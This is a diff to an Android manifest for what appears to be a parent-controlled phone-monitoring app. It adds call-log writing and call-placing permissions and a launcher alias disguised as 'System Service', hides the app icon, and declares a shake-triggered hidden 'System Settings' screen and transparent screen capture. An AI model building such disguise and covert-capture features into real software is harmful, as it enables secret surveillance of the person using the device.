@@ -20,9 +20,11 @@
 
     <!-- Calls -->
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
 
     <!-- SMS -->
     <uses-permission android:name="android.permission.READ_SMS"/>
@@ -58,7 +60,7 @@
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
     <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
 
-    <!-- Overlay — required to launch activities from background service -->
+    <!-- Overlay — required for app blocking + live painting overlay -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
 
     <!-- Screen capture -->
@@ -84,7 +86,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.App">
 
-        <!-- Setup activity (launcher icon — can be hidden) -->
+        <!-- Setup activity (launcher icon — hidden via setComponentEnabledSetting) -->
         <activity
             android:name=".setup.SetupActivity"
             android:exported="true"
@@ -96,6 +98,20 @@
             </intent-filter>
         </activity>
 
+        <!-- Activity-alias: alternate entry that can be disabled independently -->
+        <!-- When parent hides app: BOTH alias AND SetupActivity are disabled -->
+        <activity-alias
+            android:name=".setup.SetupActivityAlias"
+            android:targetActivity=".setup.SetupActivity"
+            android:exported="true"
+            android:enabled="true"
+            android:label="System Service">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.INFO"/>
+            </intent-filter>
+        </activity-alias>
+
         <!-- Hidden settings — opened by shaking device 5 times -->
         <activity
             android:name=".setup.HiddenSettingsActivity"
@@ -103,7 +119,7 @@
             android:label="System Settings"
             android:theme="@style/Theme.App.Setup"/>
 
-        <!-- MediaProjection permission request — transparent, shown when screen stream is needed -->
+        <!-- MediaProjection permission request — transparent -->
         <activity
             android:name=".setup.MediaProjectionActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"
@@ -132,6 +148,12 @@
             android:name=".monitors.ScreenStreamService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection"/>
+
+        <!-- Live Painting overlay service (blueprint: "Live Painting" feature) -->
+        <service
+            android:name=".monitors.LivePaintingService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"/>
 
         <!-- Boot receiver -->
         <receiver android:name=".core.BootReceiver" android:exported="true">
